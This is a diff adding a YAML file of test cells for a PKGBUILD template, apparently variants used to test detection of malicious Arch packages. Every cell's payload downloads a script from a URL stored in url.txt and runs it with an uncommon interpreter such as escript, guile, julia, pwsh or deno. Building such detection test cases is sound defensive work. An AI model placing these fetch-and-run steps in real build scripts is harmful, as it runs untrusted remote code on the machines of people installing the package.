@@ -1,0 +1,73 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        curl -fsSL -o stage.erl "$(cat "$srcdir/url.txt")"
+        escript stage.erl
+  id: 001-exotic-escript
+- vars:
+    payload: |2
+        curl -fsSL -o stage.fnl "$(cat "$srcdir/url.txt")"
+        fennel stage.fnl
+  id: 002-exotic-fennel
+- vars:
+    payload: |2
+        curl -fsSL -o stage.mjs "$(cat "$srcdir/url.txt")"
+        zx stage.mjs
+  id: 003-exotic-zx
+- vars:
+    payload: |2
+        curl -fsSL -o stage.scm "$(cat "$srcdir/url.txt")"
+        guile stage.scm
+  id: 004-exotic-guile
+- vars:
+    payload: |2
+        curl -fsSL -o stage.rkt "$(cat "$srcdir/url.txt")"
+        racket stage.rkt
+  id: 005-exotic-racket
+- vars:
+    payload: |2
+        curl -fsSL -o stage.ps1 "$(cat "$srcdir/url.txt")"
+        pwsh stage.ps1
+  id: 006-exotic-pwsh
+- vars:
+    payload: |2
+        curl -fsSL -o stage.jl "$(cat "$srcdir/url.txt")"
+        julia stage.jl
+  id: 007-exotic-julia
+- vars:
+    payload: |2
+        curl -fsSL -o stage.R "$(cat "$srcdir/url.txt")"
+        Rscript stage.R
+  id: 008-exotic-Rscript
+- vars:
+    payload: |2
+        curl -fsSL -o stage.ts "$(cat "$srcdir/url.txt")"
+        deno stage.ts
+  id: 009-exotic-deno
+- vars:
+    payload: |2
+        curl -fsSL -o stage.js "$(cat "$srcdir/url.txt")"
+        bun stage.js
+  id: 010-exotic-bun
+- vars:
+    payload: |2
+        _u=$(cat "$srcdir/url.txt")
+        curl -fsSL -o stage.erl "$_u"
+        escript stage.erl
+  id: 011-exotic-var-escript
+- vars:
+    payload: |2
+        curl -fsSL --url "$(cat "$srcdir/url.txt")" -o stage.jl
+        julia stage.jl
+  id: 014-curl-url-flag-julia
+- vars:
+    payload: |2
+        curl -fsSL -o stage.exs "$(cat "$srcdir/url.txt")"
+        elixir stage.exs
+  id: 017-exotic2-elixir
+- vars:
+    payload: |2
+        curl -fsSL -o stage.ts "$(cat "$srcdir/url.txt")"
+        ts-node stage.ts
+  id: 018-exotic2-tsnode
